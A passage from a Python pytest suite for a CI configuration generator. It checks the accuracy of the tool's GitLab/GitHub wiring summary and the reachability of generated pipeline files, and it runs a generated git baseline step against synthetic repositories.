@pytest.mark.parametrize("lang", sorted(_SUMMARY_MARKERS))
@pytest.mark.parametrize("ci", _SUMMARY_CI_VALUES)
@pytest.mark.parametrize("shape", sorted(_ROOT_SHAPES))
def test_summary_wiring_line_reports_what_init_actually_did(
    lang, shape, ci, tmp_path, capsys, monkeypatch,
) -> None:
    monkeypatch.setattr(ip, "_LANG", lang)
    wired_phrase, paste_phrase = _SUMMARY_MARKERS[lang]

    root = tmp_path / f"{shape}-{ci}"
    root.mkdir()
    body = _ROOT_SHAPES[shape]
    if body is not None:
        (root / ".gitlab-ci.yml").write_text(
            body, encoding="utf-8", newline="\n")

    config = {
        "ci": ci,
        "deploy": "kustomize",
        "rule_packs": ["mariadb"],
        "tenants": ["db-a"],
        "namespace": "monitoring",
        "da_tools_image": "ghcr.io/vencil/da-tools:latest",
    }
    created = ip.run_init(config, str(root))
    ip._print_summary(created, str(root), config)
    summary = capsys.readouterr().out
    # Markers are matched case-insensitively: the English strings capitalise
    # at the start of a step ("Paste the include above"), and pinning case
    # would make this test fail on rewording rather than on regression.
    haystack = summary.lower()
    # ⛔ The needs-work marker is the bare ⚠️ glyph, which grades "is any step
    # flagged" over the WHOLE summary. That was sound while CI wiring was the
    # only thing that could warn. It no longer is: the apply stage now warns
    # that cluster credentials are the customer's step, and that warning is
    # true on every path including `--ci github` and greenfield — so an
    # unscoped ⚠️ made six of these rows fail for a warning they are not
    # about. Scope it to lines that name a CI artifact, which is what every
    # wiring warning does and what no other step does.
    _CI_PATH_HINTS = (".gitlab-ci.yml", ".gitlab-ci.d/", ".github/workflows/")
    wiring = "\n".join(
        ln for ln in summary.splitlines()
        if any(hint in ln for hint in _CI_PATH_HINTS)
    ).lower()

    if ci == "github":
        # ⛔ The `--ci github` summary had no assertion of any kind, which is
        # how "delete the GitHub wiring line" survived. Two properties: the
        # wiring line is present and names the workflow, and nothing GitLab
        # is mentioned at all — the root shell is not written on this path,
        # so any GitLab sentence here would be describing a file that does
        # not exist.
        assert any(
            "GitHub Actions" in ln and _GH_WORKFLOW.as_posix() in ln
            for ln in summary.splitlines()
        ), f"--ci github printed no GitHub wiring line.\n{summary}"
        assert _GL_ROOT_SHELL.as_posix() not in summary, (
            "--ci github mentioned the GitLab root shell, which this path "
            f"never writes.\n{summary}"
        )
        assert paste_phrase not in wiring, (
            f"--ci github asked for GitLab wiring.\n{summary}")
        return

    if ci == "gitlab":
        # ⛔ The MIRROR of the `github` arm above, and its absence was a
        # finding: that arm carried the symmetric argument in prose ("any
        # GitLab sentence here would be describing a file that does not
        # exist") while only one direction was asserted. Measured — widening
        # the GitHub wiring line's guard to `if True:` left the whole of
        # tests/ops green while `--ci gitlab` printed "GitHub wiring done:
        # .github/workflows/dynamic-alerting.yaml sits where GitHub Actions
        # auto-loads it" for a file the run never wrote. #1357's own shape, on
        # the leg this test declares it is watching.
        assert _GH_WORKFLOW.as_posix() not in summary, (
            "--ci gitlab mentioned the GitHub workflow, which this path "
            f"never writes.\n{summary}"
        )
        assert "GitHub Actions" not in summary, (
            "--ci gitlab named GitHub Actions in its summary.\n"
            f"{summary}"
        )

    if shape == "greenfield":
        # We wrote the root shell ourselves this run. Saying "already in
        # place — nothing to do" about our own new file is a false report of
        # a customer-owned pipeline, and it suppresses nothing the customer
        # needs, so no other assertion would catch it.
        assert wired_phrase not in haystack, (
            "a greenfield run described the root shell it just wrote as the "
            f"customer's pre-existing one.\nsummary was:\n{summary}"
        )
        assert paste_phrase not in wiring, (
            "a greenfield run asked the customer to paste an include the "
            f"tool already wrote.\nsummary was:\n{summary}"
        )
    elif shape == "wired":
        assert wired_phrase in haystack, (
            "an already-wired root file did not get the nothing-to-do "
            f"sentence.\nsummary was:\n{summary}"
        )
        assert paste_phrase not in wiring, (
            "the summary told a customer whose root file already includes "
            f"our pipeline to paste it again.\nsummary was:\n{summary}"
        )
    else:
        # Every remaining shape leaves the customer with work to do.
        assert paste_phrase in wiring, (
            f"shape {shape!r} did not flag that manual wiring is required."
            f"\n{summary}"
        )
        assert f"- local: {_GL_PIPELINE.as_posix()}" in summary, summary
        if shape == "needs-include":
            # No `include:` key at all — a brand-new top-level key appended
            # at the end of the document is style-independent, so the
            # ready-made block is safe here and only here.
            assert any(ln.strip() == "include:"
                       for ln in summary.splitlines()), summary
        else:
            # ⛔ Every other existing-file shape gets the END STATE, never a
            # paste-ready fragment. A fragment carries indentation and
            # block/flow style we cannot see: scalar / single-mapping /
            # empty `include:`, flow sequences, aliases, and block lists
            # indented 0 or 4 spaces were each demonstrated to turn the
            # customer's whole root pipeline into a syntax error when they
            # followed the printed instruction.
            assert "<keep your existing entries here>" in summary, (
                f"shape {shape!r} was handed a paste-ready fragment instead "
                f"of the end-state example.\nsummary was:\n{summary}"
            )
            # ⛔ WHICH lead sentence. Up to here every needs-work shape got
            # byte-identical assertions, so `unparseable-with-include` — the
            # row added for exactly one behaviour — graded nothing that
            # `needs-append` did not already grade. It was decorative.
            #
            # The behaviour it exists for: a document that did not parse is
            # still LINE-SCANNED for a top-level `include:`, because
            # `!reference` is the ordinary route into "did not parse" and a
            # pipeline sophisticated enough to use it almost certainly
            # already has one — the exact repo where a second `include:` key
            # silently deletes the customer's own entries. So the classifier
            # answers NEEDS_APPEND there, not UNPARSEABLE, and the printed
            # lead says "already has an `include:`" rather than "could not be
            # parsed". Both mutations that erase the scan (return
            # UNPARSEABLE unconditionally; make `_GL_INCLUDE_KEY_RE` never
            # match) survived until this assertion existed.
            unparseable_lead = {
                "en": "could not be parsed",
                "zh": "無法解析它",
            }[lang]
            has_include_lead = {
                "en": "already has an `include:`",
                "zh": "且已經有 `include:`",
            }[lang]
            if shape == "unparseable-no-include":
                assert unparseable_lead in summary, (
                    "a root file that neither parses nor carries an "
                    f"`include:` was not reported as unparseable.\n{summary}")
            else:
                assert has_include_lead in summary, (
                    f"shape {shape!r} was told its root file could not be "
                    "parsed, when what we can see is that it HAS an "
                    "`include:`. For the `!reference` case that is the "
                    "difference between 'edit your existing include' and a "
                    "sentence that invites a second `include:` key — which "
                    f"drops every entry they have.\n{summary}")
                assert unparseable_lead not in summary, (
                    f"shape {shape!r} got the unparseable lead as well.\n"
                    f"{summary}")

    if ci == "both":
        # ⛔ Deleting the GitHub wiring line, and deleting the `--ci both`
        # carve-out that stops a GitLab-only manual step from being spoken
        # over "GitHub Actions + GitLab CI", both survived the whole suite.
        # The carve-out carries an eight-line comment arguing it is
        # load-bearing; nothing pinned it.
        # ⛔ The SENTENCE, not the platform name. Every `--ci both` summary
        # contains "GitHub Actions" twice — the wiring line and the closing
        # line — so a bare substring test is satisfied by the closing line
        # and deleting the wiring line entirely survives. Match it by the
        # workflow path it must name.
        assert any(
            "GitHub Actions" in ln and _GH_WORKFLOW.as_posix() in ln
            for ln in summary.splitlines()
        ), (f"--ci both printed no GitHub wiring line naming "
            f"{_GH_WORKFLOW.as_posix()}.\n{summary}")
        if shape not in ("greenfield", "wired"):
            # The defect this pins is the COMBINED platform name being used
            # for a GitLab-only condition — "only then does GitHub Actions +
            # GitLab CI validate", two steps after a line saying GitHub
            # wiring is already done. Naming the two legs separately in one
            # sentence is the fix, so grep for the combined name, not for a
            # gating word.
            assert "GitHub Actions + GitLab CI" not in summary, (
                "a GitLab-only manual step was spoken over the combined "
                "platform name — GitHub auto-loads .github/workflows/ and "
                f"validates on push regardless.\n{summary}"
            )

    # ⛔ In every shape and locale: the closing line must not resurrect the
    # unconditional pre-#1357 claim. Stated as a property rather than a
    # sentence so it cannot be satisfied by rewording.
    needs_action = shape == "needs-append"
    closing = [ln for ln in summary.splitlines() if "GitLab CI" in ln]
    assert closing, f"no closing platform line at all.\n{summary}"
    if needs_action:
        # ⛔ The property is "does not promise unconditional validation", not
        # "contains the word include". The remedy is not always an include —
        # on the `--output-dir`-below-repo-root path it is "move the file",
        # and GitHub has no include mechanism at all — so pinning the word
        # made the assertion fail on a correct rewording rather than on a
        # regression. What must never come back is the bare promise.
        unconditional = [
            ln for ln in closing
            if ("automatically validate" in ln or "會自動驗證" in ln)
            and "only" not in ln.lower() and "才會" not in ln
        ]
        assert not unconditional, (
            "the closing line promises validation unconditionally on a path "
            f"where the customer still has work to do.\n{summary}"
        )


# ============================================================
# ── The #1357 property, stated platform-generally ──
# ============================================================

# Where each platform LOOKS, as a predicate on a repo-relative POSIX path.
# ⛔ Enumerated from the platforms' own loading rules, not from what this
# generator happens to emit — the whole point is to catch an artifact written
# somewhere new.
_AUTOLOADED = {
    "github": lambda p: bool(
        re.fullmatch(r"\.github/workflows/[^/]+\.ya?ml", p)
    ),
    "gitlab": lambda p: p == ".gitlab-ci.yml",
}

# Which generated paths belong to which platform (a path can only be judged
# against the platform that would load it).
_PLATFORM_OF = {
    "github": lambda p: p.startswith(".github/"),
    "gitlab": lambda p: p == ".gitlab-ci.yml" or p.startswith(".gitlab-ci.d/"),
}


def _unreachable_ci_artifacts(files: dict[str, str]) -> list[str]:
    """Return the CI artifacts that neither run nor explain how to make them.

    ``files`` maps repo-relative POSIX path -> file text. An artifact passes if
    EITHER of the two things #1357 asks for is true:

      1. it sits at a location its platform auto-loads; or
      2. it is wired in from such a location — some auto-loaded artifact of the
         same platform names it — or it carries the wiring instructions itself
         (its own text names the auto-loaded path AND the mechanism).

    Branch 2's second half is what keeps the property honest for a tool that
    may legitimately be unable to write the auto-loaded file (a customer repo
    that already has one): "here is the line to paste" is a real answer, and a
    file that says nothing is not.
    """
    unreachable = []
    for path, text in sorted(files.items()):
        platform = next(
            (name for name, owns in _PLATFORM_OF.items() if owns(path)), None,
        )
        if platform is None:
            continue
        if _AUTOLOADED[platform](path):
            continue
        wired_from = any(
            path in other_text
            for other, other_text in files.items()
            if _PLATFORM_OF[platform](other) and _AUTOLOADED[platform](other)
        )
        self_documents = "include" in text and any(
            _AUTOLOADED[platform](cand)
            for cand in re.findall(r"[\w./-]+\.ya?ml", text)
        )
        if not (wired_from or self_documents):
            unreachable.append(path)
    return unreachable


def test_unreachable_ci_artifact_detector_can_say_no() -> None:
    """⛔ The control. Without it the property test below proves nothing.

    Every input this classifier meets in practice passes, so a version of it
    that returns ``[]`` unconditionally would be indistinguishable from a
    correct one. These three cases are the shapes #1357 actually described,
    each hand-built to be rejected for a different reason.
    """
    # The pre-#1357 world: a pipeline nothing loads and nothing explains.
    assert _unreachable_ci_artifacts({
        ".gitlab-ci.d/dynamic-alerting.yml": "stages: [validate]\n",
    }) == [".gitlab-ci.d/dynamic-alerting.yml"]

    # A root file that exists but includes something else entirely.
    assert _unreachable_ci_artifacts({
        ".gitlab-ci.yml": "include:\n  - local: .gitlab-ci.d/other.yml\n",
        ".gitlab-ci.d/dynamic-alerting.yml": "stages: [validate]\n",
    }) == [".gitlab-ci.d/dynamic-alerting.yml"]

    # A GitHub workflow parked outside the auto-loaded directory.
    assert _unreachable_ci_artifacts({
        ".github/dynamic-alerting.yaml": "name: x\n",
    }) == [".github/dynamic-alerting.yaml"]

    # ⛔ `self_documents` is a conjunction, and only its first half is
    # exercised above. Weakening it to `"include" in text` leaves every other
    # case here green, which would let a pipeline that merely *uses* `include:`
    # for its own composition certify itself as reachable — #1357 regressing
    # to green. This case pins the second half: the word is present, the
    # filenames it names are real, and not one of them is auto-loaded.
    assert _unreachable_ci_artifacts({
        ".gitlab-ci.d/dynamic-alerting.yml": (
            "include:\n"
            "  - local: .gitlab-ci.d/shared-jobs.yml\n"
            "stages: [validate]\n"
        ),
    }) == [".gitlab-ci.d/dynamic-alerting.yml"]

    # …and the two passing shapes, so the classifier is not simply strict.
    assert _unreachable_ci_artifacts({
        ".gitlab-ci.yml": "include:\n  - local: .gitlab-ci.d/dynamic-alerting.yml\n",
        ".gitlab-ci.d/dynamic-alerting.yml": "stages: [validate]\n",
    }) == []
    assert _unreachable_ci_artifacts({
        ".github/workflows/dynamic-alerting.yaml": "name: x\n",
    }) == []


@pytest.mark.parametrize("ci,deploy", MATRIX)
def test_generated_ci_config_is_reachable_or_ships_wiring(
    generated, ci, deploy,
) -> None:
    """#1357's assertion, in the issue's own words, for every platform.

    「產出的 CI 設定必須位於該平台會自動載入的位置，或產物本身帶有接線說明」
    — generated CI config must sit where its platform auto-loads it, or ship
    the wiring instructions with it.

    ⛔ Deliberately NOT "assert the root .gitlab-ci.yml exists": that is the
    current implementation of the property, and pinning an implementation is
    what let the original defect stand for so long — every existing check
    validated the file that was written, none asked whether anything would
    read it. Stated as a property, a future move of the pipeline (to
    `.gitlab/ci/`, into the root file directly, wherever) is only red if it
    breaks reachability. `test_unreachable_ci_artifact_detector_can_say_no` is
    the control that keeps this from being a tautology.
    """
    root = generated[(ci, deploy)]
    files = {
        p.relative_to(root).as_posix(): p.read_text(encoding="utf-8")
        for p in root.rglob("*") if p.is_file()
    }
    ci_files = {
        p for p in files
        if any(owns(p) for owns in _PLATFORM_OF.values())
    }
    assert ci_files, (
        f"--ci {ci} --deploy {deploy} wrote no CI artifact at all "
        f"(files: {sorted(files)}) — this test would have verified nothing."
    )

    unreachable = _unreachable_ci_artifacts(files)
    assert not unreachable, (
        f"`da-tools init --ci {ci} --deploy {deploy}` wrote CI config at "
        f"{unreachable}, which the target platform does not auto-load and "
        "which nothing wires in or explains. That is #1357: a file that "
        "validates perfectly and never runs. Either put it where the platform "
        "looks, include it from there, or ship the wiring instructions inside "
        "it."
    )


_BASELINE_STEP = "Resolve base config snapshot"
_SHELL_TOOLS = ("git", "bash", "tar")


def _extract_step(root: Path, step_name: str) -> tuple[dict, dict, dict]:
    """Return (the named step, the workflow-level env, the job-level env)."""
    wf = yaml.safe_load((root / _GH_WORKFLOW).read_text(encoding="utf-8"))
    job = wf["jobs"]["generate"]
    steps = job["steps"]
    for step in steps:
        if step.get("name") == step_name:
            return (
                step,
                {k: str(v) for k, v in (wf.get("env") or {}).items()},
                {k: str(v) for k, v in (job.get("env") or {}).items()},
            )
    raise AssertionError(
        f"{step_name!r} is not in the generate job; steps are "
        f"{[s.get('name') for s in steps]}"
    )


# The Actions expressions this harness knows how to stand in for. Anything
# else must fail loudly rather than be dropped — see _resolve_step_env.
_EXPRESSION_STANDINS = {"${{ github.event.pull_request.base.sha }}": "base_sha"}


def _resolve_step_env(step: dict, wf_env: dict, job_env: dict, *,
                      base_sha: str, expect_step_env: bool = True) -> dict:
    """Build the step's environment FROM the step, not from this file.

    ⛔ This reads `step["env"]` on purpose. An earlier version of this harness
    exported `BASE_SHA` itself, which made the generated `env:` block invisible
    to every test here: deleting that block left the whole module green while
    the shipped step lost its only binding to the PR's base commit — and the
    step then failed with "the checkout step needs fetch-depth: 0" on a
    repository whose checkout was already correct, i.e. two unrelated causes
    collapsing into one message. Supplying the value here instead of reading it
    would re-open exactly that hole.
    """
    known = {"base_sha": base_sha}
    # ⛔ ALL THREE Actions env scopes, in the order the runner applies them:
    # workflow, then job, then step. An earlier version read workflow and
    # step and silently dropped the job level — measured: giving the
    # `generate` job its own `CONFIG_DIR` left every test in this file green
    # while the shipped step would have run against a different directory,
    # taken the "no config here" branch and reported a first import. Reading
    # two of three scopes is the same shape of hole this function exists to
    # close, one level up.
    resolved = {}
    for key, raw in {**wf_env, **job_env}.items():
        value = str(raw).strip()
        assert "${{" not in value, (
            f"workflow env {key}={value!r} is an Actions expression this "
            "harness has no stand-in for. Add one to _EXPRESSION_STANDINS and "
            "resolve it here — exporting it verbatim would put a literal "
            "'${{ ... }}' into the shell and hide whatever it binds."
        )
        resolved[key] = value
    step_env = step.get("env") or {}
    if expect_step_env:
        assert step_env, (
            f"step {step.get('name')!r} declares no `env:`. If the generated "
            "step stopped binding the base commit that way, this harness would "
            "quietly supply nothing and the resulting failure would read as a "
            "shallow clone. Update this harness deliberately, do not delete "
            "the assertion."
        )
    else:
        # Pinning the ABSENCE, the same way `_CLI_GH_TRIGGERS` pins the missing
        # `branches:` key. The blast-radius step draws CONFIG_DIR and
        # DA_TOOLS_IMAGE from the workflow scope and binds nothing itself;
        # saying so here means a step that STARTS binding something cannot slip
        # past this harness under a flag that was meant to say "nothing to
        # bind".
        assert not step_env, (
            f"step {step.get('name')!r} now declares `env:` "
            f"({sorted(step_env)}), but this call site says it binds nothing. "
            "Resolve the new binding here instead of flipping the flag."
        )
    for key, raw in step_env.items():
        value = str(raw).strip()
        if "${{" in value:
            slot = _EXPRESSION_STANDINS.get(value)
            assert slot is not None, (
                f"step env {key}={value!r} is an Actions expression this "
                "harness has no stand-in for. Add one to _EXPRESSION_STANDINS "
                "— dropping it makes the binding invisible again."
            )
            value = known[slot]
        resolved[key] = value
    return resolved


_RUN_EXPRESSION = re.compile(r"\$\{\{\s*([^}]+?)\s*\}\}")


def _substitute_run_expressions(body: str, *, workspace: str,
                                env: dict) -> str:
    """Stand in for the runner's expression pass over a ``run:`` body.

    ⛔ Without this the script reaches bash with a literal ``${{ ... }}`` in
    it, which is a bad substitution rather than the path the runner would have
    produced. That is not a hypothetical: an earlier counterfactual for this
    module fed a raw ``${{ github.event.pull_request.base.sha }}`` to bash and
    reported every case as loudly failing, when substituting it correctly
    showed every case passing SILENTLY — the opposite conclusion, from the
    same experiment.

    Unknown expressions are a hard failure for the same reason
    ``_resolve_step_env`` refuses them: standing in for one incorrectly is
    worse than not running the step at all.
    """
    def repl(match: "re.Match[str]") -> str:
        expr = match.group(1)
        if expr == "github.workspace":
            # `.` rather than an absolute path: this bash may be WSL, which
            # mangles a Windows drive path. Every other path in these steps is
            # already relative to the working directory.
            return workspace
        if expr.startswith("env."):
            key = expr[len("env."):]
            assert key in env, (
                f"`run:` references ${{{{ env.{key} }}}}, which is not in the "
                f"resolved environment ({sorted(env)}). The runner would "
                "expand it to an empty string and the step would act on a "
                "path that is missing its middle segment."
            )
            return env[key]
        raise AssertionError(
            f"`run:` contains ${{{{ {expr} }}}}, an Actions expression this "
            "harness has no stand-in for. Add one here — leaving it verbatim "
            "puts a bad substitution into the shell and the resulting failure "
            "says nothing about the step."
        )
    return _RUN_EXPRESSION.sub(repl, body)


def _git(repo: Path, *args: str) -> str:
    # `-c` overrides rather than inheriting: a developer with a global
    # commit.gpgsign or core.hooksPath would otherwise make these fixture
    # commits FAIL (not skip), turning a local git preference into a red test.
    p = subprocess.run(
        ["git", "-c", "commit.gpgsign=false", "-c", "core.hooksPath=", *args],
        cwd=repo, capture_output=True, encoding="utf-8", errors="replace",
        timeout=60,
    )
    assert p.returncode == 0, f"git {' '.join(args)} failed: {p.stderr}"
    return p.stdout.strip()


# The two commits differ in this value so the extracted baseline can be
# checked for CONTENT, not just for a filename. Asserting the filename alone
# would pass just as happily if the step archived HEAD instead of the base —
# measured: swapping `git archive "$BASE_SHA"` for `git archive HEAD` left a
# filename-only oracle green.
_BASE_CPU = "70"
_HEAD_CPU = "90"


def _tenant_yaml(cpu: str) -> str:
    return f'tenants:\n  db-a:\n    container_cpu: "{cpu}"\n'


def _symlinks_usable(tmp: Path) -> bool:
    """Can this host create a symlink at all? (Windows without privilege: no.)"""
    probe = tmp / "_symlink_probe"
    probe.mkdir(parents=True, exist_ok=True)
    (probe / "target").write_text("x\n", encoding="utf-8", newline="\n")
    try:
        (probe / "link").symlink_to("target")
    except (OSError, NotImplementedError):
        return False
    return (probe / "link").is_symlink()


def _synthetic_repo(root: Path, *, base_has_config: bool,
                    export_ignore: str | None = None,
                    symlink: bool = False, submodule: bool = False) -> str:
    """Two commits; return the sha of the first, which plays the PR base.

    ``export_ignore`` is ``"all"`` (the whole config directory), ``"partial"``
    (one file of two) or ``None``. TWO tenant files, not one: with a single
    file, "expected count derived from ls-tree" and "expected count hardcoded
    to 1" are indistinguishable, so the derivation this step advertises had no
    behavioural coverage at all.
    """
    root.mkdir(parents=True, exist_ok=True)
    _git(root, "init", "-q", "-b", "main")
    _git(root, "config", "user.email", "test@example.invalid")
    _git(root, "config", "user.name", "test")
    (root / "README.md").write_text("base\n", encoding="utf-8", newline="\n")
    if export_ignore is not None:
        # `git archive` honours this; `git cat-file` does not. That asymmetry
        # is the whole reason the step needs a post-condition on what came
        # out, rather than only checks on what should have been there.
        rule = ("conf.d/ export-ignore\n" if export_ignore == "all"
                else "conf.d/db-b.yaml export-ignore\n")
        (root / ".gitattributes").write_text(rule, encoding="utf-8",
                                             newline="\n")
    if base_has_config and not submodule:
        (root / "conf.d").mkdir(exist_ok=True)
        (root / "conf.d" / "db-a.yaml").write_text(
            _tenant_yaml(_BASE_CPU), encoding="utf-8", newline="\n")
        (root / "conf.d" / "db-b.yaml").write_text(
            _tenant_yaml(_BASE_CPU), encoding="utf-8", newline="\n")
        if symlink:
            # A reverse control. `git ls-tree` lists a symlink; `find -type f`
            # does not, so a count-based post-condition failed a perfectly
            # healthy repository here. Measured before the fix: rc=1 with the
            # extraction fully correct.
            (root / "conf.d" / "db-alias.yaml").symlink_to("db-a.yaml")
    _git(root, "add", "-A")
    if submodule:
        # A gitlink whose commit belongs to no repository reachable from here
        # — what a real submodule looks like from the superproject. Plumbing,
        # so the fixture needs no second repository. ⛔ AFTER `git add -A`:
        # that command stages deletions, and with no `conf.d` in the working
        # tree it removes the entry again. (Measured — the first version of
        # this fixture silently produced an ordinary "no config dir at base".)
        _git(root, "update-index", "--add", "--cacheinfo",
             f"160000,{'a' * 40},conf.d")
    _git(root, "commit", "-qm", "base")
    base_sha = _git(root, "rev-parse", "HEAD")

    if submodule:
        # Once `conf.d` is a gitlink in HEAD, `git add -A` will not descend
        # into it (its content belongs to the submodule, not here), so the
        # head commit has to change something else or there is nothing to
        # commit at all. Only the BASE matters for this state.
        (root / "README.md").write_text("head\n", encoding="utf-8",
                                        newline="\n")
    else:
        (root / "conf.d").mkdir(exist_ok=True)
        (root / "conf.d" / "db-a.yaml").write_text(
            _tenant_yaml(_HEAD_CPU), encoding="utf-8", newline="\n")
    _git(root, "add", "-A")
    _git(root, "commit", "-qm", "head")
    return base_sha


def _run_generated_step(step: dict, wf_env: dict, job_env: dict, work: Path,
                        base_sha: str, env_overrides: dict | None = None, *,
                        expect_step_env: bool = True,
                        stub_docker: tuple[int, str] | None = None):
    (work / ".output").mkdir(parents=True, exist_ok=True)
    (work / "_runner_temp").mkdir(exist_ok=True)
    env = _resolve_step_env(step, wf_env, job_env, base_sha=base_sha,
                            expect_step_env=expect_step_env)
    # ⚠️ Only for values a CUSTOMER sets, never for a binding the artifact
    # declares. CONFIG_DIR is a documented knob; overriding it here simulates
    # someone who wrote it their own way, which is different in kind from the
    # harness inventing a value the workflow was supposed to supply.
    if env_overrides:
        for key in env_overrides:
            assert key in env, (
                f"{key} is not in the generated environment, so overriding it "
                "here would be this harness inventing a binding rather than "
                "varying a customer-set one."
            )
        env.update(env_overrides)
    # RUNNER_TEMP is supplied by the runner, not by the workflow, so it is the
    # one value this harness legitimately invents.
    env["RUNNER_TEMP"] = "_runner_temp"
    # Written into the script rather than passed through the child environment:
    # on a Windows host `bash` may be WSL, which starts a fresh Linux
    # environment and drops the parent's variables (measured — a passed
    # BASE_SHA arrived empty, and every case then failed identically for a
    # reason that had nothing to do with the step).
    prologue = "".join(f"export {k}='{v}'\n" for k, v in sorted(env.items()))
    if stub_docker is not None:
        rc, payload = stub_docker
        # A shell FUNCTION, not an executable on PATH: this bash may be WSL
        # running against a Windows filesystem, where the exec bit does not
        # stick and a PATH shim would silently never run — the step would then
        # reach the real `docker`, or none, and the case would pass or fail for
        # a reason unrelated to the guard under test. A function is resolved
        # ahead of PATH by the same shell that runs the step, so the
        # interception cannot fail quietly.
        #
        # The payload goes through a file so its content needs no quoting: the
        # EMPTY report is the whole point of three of these states, and an
        # inline `printf` would make "empty" a property of this harness's
        # escaping rather than of the stub.
        (work / "_stub_stdout").write_text(payload, encoding="utf-8",
                                           newline="\n")
        prologue += f"docker() {{ cat _stub_stdout; return {rc}; }}\n"
    # The runner expands `${{ ... }}` before bash ever sees the body. Skipping
    # that leaves a bad substitution in the script, which fails for a reason
    # that has nothing to do with the step — see _substitute_run_expressions.
    body = _substitute_run_expressions(str(step["run"]), workspace=".",
                                       env=env)
    (work / "_step.sh").write_text(prologue + body,
                                   encoding="utf-8", newline="\n")
    # `bash -e` and a RELATIVE script name: that is the default shell Actions
    # uses for `run:` (note: no pipefail), and an absolute Windows path gets
    # mangled by this bash.
    return subprocess.run(["bash", "-e", "_step.sh"], cwd=work,
                          capture_output=True, encoding="utf-8",
                          errors="replace", timeout=120)


@pytest.mark.skipif(
    any(shutil.which(t) is None for t in _SHELL_TOOLS),
    reason=f"executing the generated step needs {_SHELL_TOOLS} on PATH",
)
@pytest.mark.parametrize(
    "state,base_has_config,base_exists,export_ignore,symlink,want_rc,want_files", [
        ("normal", True, True, None, False, 0, ["db-a.yaml", "db-b.yaml"]),
        ("first_import", False, True, None, False, 0, []),
        ("base_not_in_clone", True, False, None, False, 1, []),
        # ⭐ These two are IMMUNITY proofs, not detection tests. `export-ignore`
        # is an archive-only attribute, and the step no longer extracts through
        # `git archive`, so a rule covering the whole directory or a single
        # file changes nothing about the baseline. Three earlier attempts to
        # DETECT the archive's silent omission were each falsified; removing
        # the cause is what finally held.
        ("export_ignored_all", True, True, "all", False, 0,
         ["db-a.yaml", "db-b.yaml"]),
        ("export_ignored_partial", True, True, "partial", False, 0,
         ["db-a.yaml", "db-b.yaml"]),
        # A gitlink at the config path: the entry exists, so a lookup of the
        # object it points at fails (that commit belongs to another repo) and
        # the fault used to be filed as a first import.
        ("config_dir_is_a_submodule", True, True, None, False, 1, []),
        # `git ls-tree -- conf.d/` lists the CHILDREN, so reading a type
        # out of it saw "blob" and rejected a healthy repository. The
        # step normalises the trailing slash; this pins that.
        ("config_dir_trailing_slash", True, True, None, False, 0,
         ["db-a.yaml", "db-b.yaml"]),
        # Reverse control: healthy input that a `-type f` count rejected.
        ("symlink_in_config_dir", True, True, None, True, 0,
         ["db-a.yaml", "db-alias.yaml", "db-b.yaml"]),
    ])
def test_generated_baseline_step_distinguishes_fault_from_first_import(
    generated, tmp_path, state, base_has_config, base_exists, export_ignore,
    symlink, want_rc, want_files,
) -> None:
    """Run the generated baseline step for real, across every state it must
    tell apart.

    ⛔ This is the first thing in this file that EXECUTES generated shell, and
    the gap it closes is why #1358 shipped: every other assertion reads the
    text. Measured against the pre-fix step, the first three states below all
    produced **exit 0 and an empty baseline** — including `normal`, where the
    base commit and the config directory were both present. So the ticket's
    stated cause (a shallow clone) was only half of it: `tar -x -C
    .output/base/` ran before anything created `.output/base`, and the `||`
    arm then made an empty directory and exited 0. Fixing `fetch-depth` alone
    would have left `normal` broken, with nothing to say so.

    The states:

    * ``normal`` — base commit present, config present at base: extract it.
    * ``first_import`` — base commit present, no config yet: legitimately
      empty, proceed, and say why.
    * ``base_not_in_clone`` — the object is missing: a fault. Comparing
      against nothing here is the failure `docs/internal/lint-policy.md` calls
      pretending to be diff-aware, so it must be loud.
    * ``export_ignored_all`` — both lookups pass and `git archive` succeeds
      while producing nothing, because it honours `.gitattributes
      export-ignore` and `git cat-file` does not. Only a post-condition on
      what arrived can see this.
    * ``export_ignored_partial`` — one file of two. Separates "the expected
      set is derived from `git ls-tree`" from "the expected count happens to
      match this fixture", which a single-file fixture could not.
    * ``symlink_in_config_dir`` — a REVERSE control: healthy input that must
      NOT fail. `git ls-tree` lists a symlink and `find -type f` does not, so
      the first version of the post-condition failed a repository whose
      extraction was completely correct. Skipped where the host cannot create
      symlinks; it runs on Linux CI, which is where it matters.

    ⚠️ ``base_not_in_clone`` is simulated with an all-zero sha rather than by
    building a real shallow clone. The predicate under test is "is this object
    in the store", which is what a shallow clone breaks; the simpler fixture
    exercises the same branch and does not depend on how a given git version
    fetches.
    """
    root = generated[("github", "kustomize")]
    step, wf_env, job_env = _extract_step(root, _BASELINE_STEP)

    if symlink and not _symlinks_usable(tmp_path):
        pytest.skip("this host cannot create symlinks (Windows without "
                    "Developer Mode / SeCreateSymbolicLinkPrivilege)")

    work = tmp_path / state
    real_base = _synthetic_repo(
        work, base_has_config=base_has_config, export_ignore=export_ignore,
        symlink=symlink, submodule=(state == "config_dir_is_a_submodule"))
    base_sha = real_base if base_exists else "0" * 40

    overrides = ({"CONFIG_DIR": wf_env["CONFIG_DIR"] + "/"}
                 if state == "config_dir_trailing_slash" else None)
    p = _run_generated_step(step, wf_env, job_env, work, base_sha,
                            env_overrides=overrides)

    config_dir = wf_env["CONFIG_DIR"]
    baseline_dir = work / ".output" / "base" / config_dir
    got_files = sorted(f.name for f in baseline_dir.glob("*")) \
        if baseline_dir.is_dir() else []

    assert p.returncode == want_rc, (
        f"{state}: expected rc={want_rc}, got {p.returncode}.\n"
        f"stdout={p.stdout[-600:]}\nstderr={p.stderr[-600:]}"
    )
    assert got_files == want_files, (
        f"{state}: expected baseline {want_files}, got {got_files}. "
        "An unexpectedly empty baseline makes config-diff report every tenant "
        "as added, which reads as a real finding."
    )
    if want_files:
        # Content, not just the name. The file exists under both the base and
        # the head commit, so a name-only oracle cannot tell "archived the
        # base" from "archived whatever was checked out".
        body = (baseline_dir / want_files[0]).read_text(encoding="utf-8")
        assert f'"{_BASE_CPU}"' in body and f'"{_HEAD_CPU}"' not in body, (
            f"{state}: the baseline holds the wrong revision of "
            f"{want_files[0]}. Expected the value from the base commit "
            f"({_BASE_CPU}); got:\n{body}"
        )
    if state == "base_not_in_clone":
        # ⛔ Both causes, not just one. A single-cause message ("the checkout
        # step needs fetch-depth: 0") is what this step shipped first, and it
        # sends an operator to change a setting the generated workflow already
        # sets — two unrelated causes collapsing into one instruction, which
        # is the same defect this step exists to remove, moved to the
        # diagnostics. Asserting only "fetch-depth" was satisfied by that
        # rejected message, so it constrained nothing.
        for cause in ("checkout", "rewritten"):
            assert cause in p.stdout, (
                f"the failure must name the {cause!r} cause; a message that "
                f"offers only one leaves the other unactionable. "
